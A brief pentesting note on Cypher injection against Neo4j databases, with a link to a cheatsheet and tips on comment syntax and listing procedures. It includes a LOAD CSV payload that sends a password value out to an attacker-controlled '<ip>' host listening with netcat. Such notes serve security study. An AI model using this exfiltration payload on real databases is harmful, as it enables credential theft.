Neo4j query language is called `cypher` and performing injection attacks is called `cypher injection`. Check the cheatsheet about all of this [here](https://pentester.land/blog/cypher-injection-cheatsheet/****)

## Useful queries

- `LOAD FROM CSV`: To extract information that would be otherwise unaccessible (because further parsed in the code for example), `LOAD FROM CSV` can be quite useful. The target can be a http link to one's own machine (after setting up netcat), and we can happen anything key/value at the end to receive the information: 
```cyhper
LOAD CSV FROM 'http://<ip>/'+password.value  RETURN password
```

- inline comment is `//` and multi-line `/*`
- Procedures are function that are available inside cypher, which can be extended with custom ones. List all procedures with: 
```cyhper
CALL dbms.procedures()
```
